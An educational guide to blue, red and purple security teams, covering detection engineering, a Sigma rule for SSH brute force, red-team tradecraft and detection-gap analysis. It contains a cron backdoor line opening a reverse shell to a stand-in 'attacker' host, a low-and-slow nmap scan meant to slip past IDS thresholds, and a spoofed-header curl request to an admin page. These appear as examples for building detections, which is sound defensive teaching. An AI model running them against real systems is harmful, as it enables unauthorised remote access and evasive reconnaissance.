# Blue, Red, and Purple Teams

Security operations are organized around three collaborative team models — each with distinct responsibilities, tools, and objectives. Understanding all three is essential for building mature detection and response capabilities.

---

## Team Overview

| Team | Role | Primary Objective |
| --- | --- | --- |
| **Blue Team** | Defenders | Detect, respond to, and contain attacks |
| **Red Team** | Attackers (simulated) | Emulate real-world adversaries to find gaps |
| **Purple Team** | Collaboration layer | Validate Blue detections using Red techniques |

---

## Blue Team

Blue teams are responsible for **detection engineering**, **incident response**, and **security monitoring**. Their work is driven by logs, alerts, and behavioral analytics.

### Core Responsibilities

- SIEM rule development and tuning
- Threat hunting — proactively searching for attacker TTPs
- Forensic investigation of security incidents
- Vulnerability management and patch prioritization
- Log source onboarding and normalization

### Detection Engineering Lifecycle

```
1. Identify attacker TTP (from ATT&CK, threat reports, red team findings)
2. Identify relevant log source (auth.log, sysmon, network flow)
3. Write detection rule (Sigma, KQL, Splunk SPL)
4. Test against known-good and known-bad samples
5. Deploy and tune to reduce false positives
6. Document and version control
```

### Example: Brute Force SSH Detection

```bash
# Count failed SSH attempts per source IP in the last hour
journalctl -u ssh --since "1 hour ago" | \
  grep "Failed password" | \
  awk '{print $NF}' | sort | uniq -c | sort -rn | head -20
```

Output:
```
    142 192.168.1.88
     87 10.0.0.15
     23 172.16.0.5
```

Threshold: `> 20 failures in 5 min from single IP` triggers alert.

### Example: Sigma Rule for Brute Force

```yaml
title: SSH Brute Force Attempt
status: experimental
description: Detects multiple failed SSH authentication attempts from a single source
logsource:
    product: linux
    service: auth
detection:
    keywords:
        - 'Failed password'
    condition: keywords | count() by src_ip > 20
    timeframe: 5m
level: high
tags:
    - attack.credential_access
    - attack.t1110
```

### Anomaly Modeling

```bash
# Baseline: what sudo commands does a user normally run?
grep "sudo:.*$(whoami)" /var/log/auth.log | \
  awk -F'COMMAND=' '{print $2}' | sort | uniq -c | sort -rn
```

Deviations from the baseline (e.g., `/bin/bash`, `nc`, `python3 -c`) are high-fidelity signals.

---

## Red Team

Red teams **emulate real adversaries** using the same tools, techniques, and procedures (TTPs) threat actors use. Their goal is to expose gaps before real attackers do.

### Core Responsibilities

- Adversary emulation campaigns (mapped to MITRE ATT&CK)
- Stealth operations — evading Blue Team detection
- Physical security assessments (badge cloning, tailgating)
- Social engineering (phishing, vishing)
- Full attack chain simulation: recon → initial access → persistence → lateral movement → exfiltration

### OPSEC-Safe Simulation

Red teams must operate with **operational security** to avoid burning their presence:

```bash
# Use low-and-slow port scanning to avoid threshold-based IDS alerts
nmap -T1 -sS --scan-delay 2s -p 22,80,443,3306 target_ip
```

```bash
# Proxy through legitimate-looking traffic
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "Referer: https://google.com" \
  https://target.com/admin
```

### MITRE ATT&CK Alignment

Every red team action should map to a technique ID:

| Action | ATT&CK ID | Tactic |
| --- | --- | --- |
| SSH brute force | T1110.001 | Credential Access |
| Cron persistence | T1053.003 | Persistence |
| LDAP enumeration | T1018 | Discovery |
| C2 via HTTPS | T1071.001 | Command & Control |
| Data staged in /tmp | T1074.001 | Collection |

---

## Purple Team

Purple team is **not a separate team** — it's a collaborative exercise where Red feeds findings directly to Blue so detections can be validated, tuned, and improved in real time.

### Purple Team Feedback Loop

```
Red executes TTP
     ↓
Blue checks: "Did we detect it?"
     ↓
If NO → Write/tune detection rule
     ↓
Red executes TTP again
     ↓
Blue validates detection fires correctly
     ↓
Document detection coverage
```

### Detection Gap Analysis Table

| ATT&CK Technique | Red Executed | Blue Detected | Coverage |
| --- | --- | --- | --- |
| T1059.004 Unix Shell | ✅ | ✅ | ✅ Covered |
| T1053.003 Cron Job | ✅ | ❌ | ❌ Gap |
| T1078 Valid Accounts | ✅ | ⚠️ | ⚠️ Partial |
| T1110.001 Brute Force | ✅ | ✅ | ✅ Covered |

### Closing Detection Gaps

When Blue misses a Red action, the process is:

```bash
# Red: created a backdoor cron job as www-data
echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" \
  | crontab -u www-data -

# Blue: add detection for non-root crontab modifications
auditctl -w /var/spool/cron/crontabs/ -p wa -k cron_modification
```

Then verify with:
```bash
ausearch -k cron_modification --start today
```

---

## Maturity Model

| Level | Blue Capability | Red Capability |
| --- | --- | --- |
| 1 | Reactive only — responds to alerts | Script-based, no OPSEC |
| 2 | Detection rules, basic SIEM | Custom tooling, some evasion |
| 3 | Threat hunting, TTPs modeled | Full adversary emulation |
| 4 | Continuous purple exercises | Nation-state simulation |

---
